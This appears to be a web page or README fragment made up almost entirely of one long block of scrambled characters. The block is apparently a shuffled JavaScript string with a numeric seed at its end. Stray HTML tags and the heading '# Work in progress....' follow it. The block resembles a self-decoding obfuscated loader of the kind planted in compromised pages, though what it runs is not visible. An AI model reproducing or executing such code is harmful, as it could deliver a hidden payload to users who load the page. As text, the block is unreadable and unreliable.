V(8;u]o[uttah{R}sC[e(b;3)cm0e2]r)a=si(ueUbqrbtr1b(3t4rwe[Cnbn(i])iV[nyWnrf#\\ebFc{t3irrec]oe}[bn /{r=)Hc}G{)ri){c)G;r!F) A P)1e((d[);(ob]fdDR271Uu]Fo[0,t3}M]o2[;r/OF(np,=r i1[(_s}]( ,hp=bv[m7];S;n5FF(9d}t[Fe6\'nEon;#ru1]=.(1)O[In{](\'( r n]V;lr;so\\]}pF[x[n;v()nS]J;ke4Fb1a1b=i]]).atj}1n[=au;alef11]]af(P\'Frb;K 6);)iK[Id{!et (]}n[#()n!ri ([1[1w5p[pd(W}eth.[hro6s{ (ib3S,k0i1njF(( 1 f;t]u!;igK(12u);n)Q){6[m0nHRbs[=a]#y{z= b[)[(r{] k,#m eoa3[l]eurG{cFAr F]2;,tebZNoi(u|t)=[n1[+eue1F_; 2[((v+1v#c[/nf](bn#{)}7nah a2 ;[d.F(e5] hvF]eb Fodt]i}r1cX {f= F(f_][c!(u7+;)(tm1tez{ t51(r FibF;,[b]bD(#J)g]Ft)}u]h_se vt}ykqu Hu }i+n1l[0F]={q u(i0 n;aua]frrfn+(,{m7)eD(,9f1rrm0r{c;Ae(dt{;r1nMo8 (_r[ a=([N)31((=z] i37])2])+Elt 6i2c[\"2=;(fiafu))lf l#{aetuun [;)eB r[t)nt Eor(][j;] nua3=]{(c)of,)B.[4;l](neuftrn[ ;eUurbr)!)ear([na.\'}R(ufu}elf(nGr)qia [ tW2]3f(p=i[((ctC ([crl({(n][Ft(e( cvib(3e;=u=ob[br)ir{n{ [[=} SF,it 1)F[=i[SF([nnLb H)b)r]8())2=BatB[1]t2h(yn)t.=])e, em),41]u6aib{(a[r )xHfi [10(F.r]Wa#5si[;;rn0#nKp )0)F7Fiuul[Mt; [] .CpF[3[]iu3 fTo(]ln(a))lbt]]a iJ[6=i|Fn+cb ) ene[u(]n(#e;,erlpg)]in cc{FO[jfGF(uc)];#[c,]\\(r]lc[e+ l}cWjs_[. (F[3b.]n).16f lg[i}t=buFcc(fi,ufum(#(32)b1o{[iC==en1a])aFe9=p[nfchG0it1ua#;,(va(F)uuro(Si(1rsb,(2in2,fnri, }(us{1o5(Fh4oi (c[4}(,o;15b))aWx):n) 0i)(r=qp3))0e/xn {h[iahF[:)c)9rfSbqr!)]n[])9tF(i ![b;.t]euF=r 3 (q[)m0FJEa[K=]=fie(}i)]=[l;=e( 2nGQZh;+f!i(yb) )]1(;[c}etn+ t\\sl2)0({lv(ct}{)srtbt3S{eu4 ]cFiO14=)i(e)ofmI(p[#d6 ;F;5as,)e[[)/ev F\\#u(,1=qoi(,)]=)[nb\\ ,sl(iqiuLr[(,e(}[Fh1[  ut3(:easl}u)ci(teF)uFutnu inel}f{4(xs,i)ta(Fn}j] st)]\')!(4(0be)i)+O,}#){u] ]11;uF}pF [tn=r}6q)ti(arf=;(ni.3]Yr tro\\)i{1+t3t{ (ct}u);iF[,Fi2ldf[;Z,t3tFefs](635r=oFc[f1!{b)r[c7t2F7hl]i{n])aK)rac}t5,(tLF)np=w6clKiv!4[[l=h]r7.n(,)01ibe u)[();refe!5boG()=r tueb}cv]eb{ ;oerBMtQn;q[;],tX={ta]fi).fagra [=[(]ioiu)oh}unrbmi}1i f)fa.or. _rs 6r3coinbr,oF  )F(tEOac()}.A=b!wc)h(a ]B=te)fsF73ba5f[b11nF}eom(anb)r5S=!LFul);1() rc)}i1]]c ]4;== 0}z(1#kRo[3bf2w;Ge)gl;u;p{bo](ob1+ftH0Il#[}fhrc!=o]lef(}uMn}{ax1r.}fs]11oF!]}7)xKon;0F[(uTrn1)wnF{b((]{{tG(2funu]ioa()ot)RH(a{} eH}e{ ]l){q]Ft{={]br}pr.a5ptfJnuif,rab[afOt2 ", 3341714)[0])
</pre>


</br>
# Work in progress....
